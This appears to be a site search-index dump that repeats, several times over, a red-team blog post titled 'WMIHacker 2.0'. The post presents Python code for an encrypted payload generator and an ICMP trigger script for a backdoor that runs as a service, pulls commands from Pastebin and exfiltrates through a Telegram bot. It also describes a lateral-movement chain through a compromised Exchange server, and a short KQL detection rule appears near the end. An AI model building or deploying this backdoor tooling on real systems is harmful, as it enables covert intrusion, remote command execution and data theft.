educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--assymetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; Assymetric approach in C2 infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 ðŸ‘¾"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; Asymetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWeâ€™ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nTool Repo: https://github.com/s0ld13rr/WMIHACKER\nEarth Kurma Chain In Trend Microâ€™s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM â€” without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Assymetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodesâ€”other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.\ndef xorshift_encrypt(data: bytes, key: int) -\u0026gt; bytes: result = bytearray() state = key \u0026amp; 0xFFFFFFFF for b in data: state ^= (state \u0026lt;\u0026lt; 13) \u0026amp; 0xFFFFFFFF state ^= (state \u0026gt;\u0026gt; 17) state ^= (state \u0026lt;\u0026lt; 5) \u0026amp; 0xFFFFFFFF prng_byte = (state \u0026amp; 0xFF) result.append(b ^ prng_byte) return bytes(result) # all these parameters are used in the payload, change for your needs KEY=0xDEADBEEF TOKEN = \u0026#34;BOT TOKEN\u0026#34; CHAT_ID = \u0026#34;CHAT ID\u0026#34; IP_ADDR = \u0026#34;VICTIM_IP\u0026#34; USER = \u0026#34;USERNAME\u0026#34; PASSWORD = \u0026#34;PASSWORD\u0026#34; COMMAND = \u0026#34;echo \u0026#39;YOU HAVE BEEN PWNED!\u0026#39; \u0026gt; C:\\\\Users\\\\Administrator\\\\hello.txt\u0026#34; msg = f\u0026#34;{TOKEN}$$$${CHAT_ID}$$$${IP_ADDR}$$$${USER}$$$${PASSWORD}$$$${COMMAND}\u0026#34;.encode() enc = xorshift_encrypt(msg, KEY) print(enc.hex()) This code (payload_gen.py) is designed to generate an encrypted payload that contains all the necessary parameters for the backdoor to operate. The payload will be uploaded to Pastebin, and the implant (on the victim machine) will later fetch, decrypt, and execute it on remote host. Parameters are separated by $$$$ and scraped on the victim host. Also, no artifacts such as BOT TOKEN or CHAT ID will be placed inside the code. It hardens the OPSEC, and may maintain the less artifacts on OS.\nfrom scapy.all import * victim_ip = input(\u0026#34;Enter the victim\u0026#39;s IP address: \u0026#34;).strip() id = input(\u0026#34;Enter the Pastebin ID: \u0026#34;).strip() packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f\u0026#34;PWN:{id}\u0026#34;) packet.show() send(packet) print(\u0026#34;Packet sent!\u0026#34;) This script (checker.py) sends a specially crafted ICMP Echo Request (ping) packet to a victim machine. The payload of the ICMP packet contains an identifier called PWN (Pastebin ID) that tells the backdoor on the victim side where to fetch the encrypted payload.\nAbove you can see the Proof of Concept implementation of the WMI-based backdoor.\nOn victims host:\nPS\u0026gt; python wmihacker.py \u0026lt;LOCAL IP\u0026gt; or\nPS\u0026gt; wmihacker.exe \u0026lt;LOCAL_IP\u0026gt; # build with PyInstaller I deployed whole project here: https://github.com/s0ld13rr/WMIHACKER\nThe attack chain might look this way:\nInitial access on a client machine via spear-phishing (T1566.001).\nThat machine sends a specially crafted packet to an internal Exchange server (already compromised).\nThe Exchange server, running a WMI backdoor, executes commands on other machines (T1047).\nCollected data is sent to a completely separate, hidden C2 server.\nAs I wrote in previus section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution. This is just a Proof-of-Concept tool and has several issues in OPSEC and Persistence.\nDetection \u0026amp; Response Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026rsquo;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise.\nTo detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used:\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026quot;S-1-5-20\u0026quot;\nExplanation:\nevent.code: 4688 â€“ Triggers on the creation of a new process.\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe â€“ Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.\nSubjectUserSid: \u0026ldquo;S-1-5-20\u0026rdquo; â€“ Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.\nResponse Actions:\nInvestigate the child process and command-line arguments.\nReview associated WMI event logs and consumer/subscription configurations.\nCorrelate with other telemetry such as network connections or abnormal service creation.\nApply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors.\nConclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts.\nWhen integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks.\n","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--assymetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; Asymetric approach in C2 infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 ðŸ‘¾"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; AsyÑŒmetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWeâ€™ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nTool Repo: https://github.com/s0ld13rr/WMIHACKER\nEarth Kurma Chain In Trend Microâ€™s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM â€” without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Assymetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodesâ€”other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.\ndef xorshift_encrypt(data: bytes, key: int) -\u0026gt; bytes: result = bytearray() state = key \u0026amp; 0xFFFFFFFF for b in data: state ^= (state \u0026lt;\u0026lt; 13) \u0026amp; 0xFFFFFFFF state ^= (state \u0026gt;\u0026gt; 17) state ^= (state \u0026lt;\u0026lt; 5) \u0026amp; 0xFFFFFFFF prng_byte = (state \u0026amp; 0xFF) result.append(b ^ prng_byte) return bytes(result) # all these parameters are used in the payload, change for your needs KEY=0xDEADBEEF TOKEN = \u0026#34;BOT TOKEN\u0026#34; CHAT_ID = \u0026#34;CHAT ID\u0026#34; IP_ADDR = \u0026#34;VICTIM_IP\u0026#34; USER = \u0026#34;USERNAME\u0026#34; PASSWORD = \u0026#34;PASSWORD\u0026#34; COMMAND = \u0026#34;echo \u0026#39;YOU HAVE BEEN PWNED!\u0026#39; \u0026gt; C:\\\\Users\\\\Administrator\\\\hello.txt\u0026#34; msg = f\u0026#34;{TOKEN}$$$${CHAT_ID}$$$${IP_ADDR}$$$${USER}$$$${PASSWORD}$$$${COMMAND}\u0026#34;.encode() enc = xorshift_encrypt(msg, KEY) print(enc.hex()) This code (payload_gen.py) is designed to generate an encrypted payload that contains all the necessary parameters for the backdoor to operate. The payload will be uploaded to Pastebin, and the implant (on the victim machine) will later fetch, decrypt, and execute it on remote host. Parameters are separated by $$$$ and scraped on the victim host. Also, no artifacts such as BOT TOKEN or CHAT ID will be placed inside the code. It hardens the OPSEC, and may maintain the less artifacts on OS.\nfrom scapy.all import * victim_ip = input(\u0026#34;Enter the victim\u0026#39;s IP address: \u0026#34;).strip() id = input(\u0026#34;Enter the Pastebin ID: \u0026#34;).strip() packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f\u0026#34;PWN:{id}\u0026#34;) packet.show() send(packet) print(\u0026#34;Packet sent!\u0026#34;) This script (checker.py) sends a specially crafted ICMP Echo Request (ping) packet to a victim machine. The payload of the ICMP packet contains an identifier called PWN (Pastebin ID) that tells the backdoor on the victim side where to fetch the encrypted payload.\nAbove you can see the Proof of Concept implementation of the WMI-based backdoor.\nOn victims host:\nPS\u0026gt; python wmihacker.py \u0026lt;LOCAL IP\u0026gt; or\nPS\u0026gt; wmihacker.exe \u0026lt;LOCAL_IP\u0026gt; # build with PyInstaller I deployed whole project here: https://github.com/s0ld13rr/WMIHACKER\nThe attack chain might look this way:\nInitial access on a client machine via spear-phishing (T1566.001).\nThat machine sends a specially crafted packet to an internal Exchange server (already compromised).\nThe Exchange server, running a WMI backdoor, executes commands on other machines (T1047).\nCollected data is sent to a completely separate, hidden C2 server.\nAs I wrote in previus section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution. This is just a Proof-of-Concept tool and has several issues in OPSEC and Persistence.\nDetection \u0026amp; Response Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026rsquo;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise.\nTo detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used:\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026quot;S-1-5-20\u0026quot;\nExplanation:\nevent.code: 4688 â€“ Triggers on the creation of a new process.\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe â€“ Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.\nSubjectUserSid: \u0026ldquo;S-1-5-20\u0026rdquo; â€“ Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.\nResponse Actions:\nInvestigate the child process and command-line arguments.\nReview associated WMI event logs and consumer/subscription configurations.\nCorrelate with other telemetry such as network connections or abnormal service creation.\nApply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors.\nConclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts.\nWhen integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks.\n","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--assymetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; AsyÑŒmetric approach in C2 infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 ðŸ‘¾"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; AsyÑŒmetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWeâ€™ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nTool Repo: https://github.com/s0ld13rr/WMIHACKER\nEarth Kurma Chain In Trend Microâ€™s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM â€” without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Asymetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodesâ€”other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.\ndef xorshift_encrypt(data: bytes, key: int) -\u0026gt; bytes: result = bytearray() state = key \u0026amp; 0xFFFFFFFF for b in data: state ^= (state \u0026lt;\u0026lt; 13) \u0026amp; 0xFFFFFFFF state ^= (state \u0026gt;\u0026gt; 17) state ^= (state \u0026lt;\u0026lt; 5) \u0026amp; 0xFFFFFFFF prng_byte = (state \u0026amp; 0xFF) result.append(b ^ prng_byte) return bytes(result) # all these parameters are used in the payload, change for your needs KEY=0xDEADBEEF TOKEN = \u0026#34;BOT TOKEN\u0026#34; CHAT_ID = \u0026#34;CHAT ID\u0026#34; IP_ADDR = \u0026#34;VICTIM_IP\u0026#34; USER = \u0026#34;USERNAME\u0026#34; PASSWORD = \u0026#34;PASSWORD\u0026#34; COMMAND = \u0026#34;echo \u0026#39;YOU HAVE BEEN PWNED!\u0026#39; \u0026gt; C:\\\\Users\\\\Administrator\\\\hello.txt\u0026#34; msg = f\u0026#34;{TOKEN}$$$${CHAT_ID}$$$${IP_ADDR}$$$${USER}$$$${PASSWORD}$$$${COMMAND}\u0026#34;.encode() enc = xorshift_encrypt(msg, KEY) print(enc.hex()) This code (payload_gen.py) is designed to generate an encrypted payload that contains all the necessary parameters for the backdoor to operate. The payload will be uploaded to Pastebin, and the implant (on the victim machine) will later fetch, decrypt, and execute it on remote host. Parameters are separated by $$$$ and scraped on the victim host. Also, no artifacts such as BOT TOKEN or CHAT ID will be placed inside the code. It hardens the OPSEC, and may maintain the less artifacts on OS.\nfrom scapy.all import * victim_ip = input(\u0026#34;Enter the victim\u0026#39;s IP address: \u0026#34;).strip() id = input(\u0026#34;Enter the Pastebin ID: \u0026#34;).strip() packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f\u0026#34;PWN:{id}\u0026#34;) packet.show() send(packet) print(\u0026#34;Packet sent!\u0026#34;) This script (checker.py) sends a specially crafted ICMP Echo Request (ping) packet to a victim machine. The payload of the ICMP packet contains an identifier called PWN (Pastebin ID) that tells the backdoor on the victim side where to fetch the encrypted payload.\nAbove you can see the Proof of Concept implementation of the WMI-based backdoor.\nOn victims host:\nPS\u0026gt; python wmihacker.py \u0026lt;LOCAL IP\u0026gt; or\nPS\u0026gt; wmihacker.exe \u0026lt;LOCAL_IP\u0026gt; # build with PyInstaller I deployed whole project here: https://github.com/s0ld13rr/WMIHACKER\nThe attack chain might look this way:\nInitial access on a client machine via spear-phishing (T1566.001).\nThat machine sends a specially crafted packet to an internal Exchange server (already compromised).\nThe Exchange server, running a WMI backdoor, executes commands on other machines (T1047).\nCollected data is sent to a completely separate, hidden C2 server.\nAs I wrote in previus section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution. This is just a Proof-of-Concept tool and has several issues in OPSEC and Persistence.\nDetection \u0026amp; Response Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026rsquo;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise.\nTo detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used:\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026quot;S-1-5-20\u0026quot;\nExplanation:\nevent.code: 4688 â€“ Triggers on the creation of a new process.\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe â€“ Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.\nSubjectUserSid: \u0026ldquo;S-1-5-20\u0026rdquo; â€“ Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.\nResponse Actions:\nInvestigate the child process and command-line arguments.\nReview associated WMI event logs and consumer/subscription configurations.\nCorrelate with other telemetry such as network connections or abnormal service creation.\nApply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors.\nConclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts.\nWhen integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks.\n","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--assymetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; AsyÑŒmetric approach in C2 infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 ðŸ‘¾"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; AsyÑŒmetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version 